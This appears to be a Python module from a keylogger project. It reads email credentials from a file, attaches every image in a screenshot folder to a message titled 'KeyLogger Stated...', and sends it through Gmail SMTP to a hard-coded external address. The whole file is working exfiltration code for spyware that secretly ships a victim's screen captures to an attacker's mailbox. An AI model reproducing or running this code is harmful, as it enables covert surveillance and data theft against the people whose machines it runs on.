
import smtplib
import imghdr
from email.message import EmailMessage

import json
import os

def SendMail():
    f = open('credentials.json',) 
    data=json.load(f)
    EMAIL_ADDRESS = data["email"]
    EMAIL_PASSWORD =data["password"]

    #print(EMAIL_ADDRESS,EMAIL_PASSWORD)


    msg = EmailMessage()
    msg['Subject'] = 'KeyLogger Stated...'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = 'pexef43981@lovomon.com'

    msg.set_content('This is a plain text email')
    path = './screenshot/'
    for images in os.listdir(path):
        print(f'{images} sent ')
        with open(path+images,'rb') as file:
            file_data=file.read()
            file_type=imghdr.what(file.name)
            file_name=file.name
        msg.add_attachment(file_data,maintype='image',subtype=file_type,filename=file_name)


    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)
SendMail()